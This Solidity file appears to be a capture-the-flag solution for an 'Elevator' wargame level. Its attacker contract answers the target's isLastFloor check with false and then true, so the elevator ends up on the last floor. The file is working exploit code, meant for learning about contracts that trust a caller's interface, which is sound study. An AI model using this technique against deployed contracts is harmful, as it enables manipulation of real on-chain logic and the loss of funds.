// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./11-Elevator.sol";

contract ElevatorAttacker {
    /*We use stateSwitch variable to decide of the return value
    of isLastFloor function. It is neccesery, because this function
    has to return in one case false and after true to hack 
    elevator contract. */
    bool public stateSwitch = false;
    Elevator public elevator;

    constructor(address _elevatorAddress) public {
        elevator = Elevator(_elevatorAddress);
    }

    function attack() public {
        /*Function goTo in Elevator contract will work on contract
        with address of msg.sender, so with this contract.
        Therefore, we implement here function isLastFloor with the
        same interface which is require in Elevator contract. */
        elevator.goTo(1);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!stateSwitch) {
            stateSwitch = true;
            return false;
        } else {
            stateSwitch = false;
            return true;
        }
    }
}
